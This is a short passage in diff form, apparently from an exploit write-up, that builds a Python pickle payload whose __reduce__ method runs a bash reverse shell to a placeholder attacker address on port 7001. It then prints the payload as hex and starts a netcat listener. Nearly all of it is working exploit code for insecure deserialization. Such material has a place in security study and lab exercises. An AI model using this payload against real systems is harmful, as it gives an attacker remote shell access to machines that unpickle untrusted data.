@@ -204,11 +204,14 @@ class RCE:
     def __reduce__(self):
         return (
             os.system,
-            ('bash -c "bash -i >& /dev/tcp/<attacker-ip>/7001 0>&1"',)
+            ('bash -c "bash -i >& /dev/tcp/<attackerip>/7001 0>&1"',)
         )
 
 payload = pickle.dumps(RCE())
 print(payload.hex())
+
+python3 gen.py
+
 
 A listener was then started on the attacker machine:
 nc -lvnp 7001
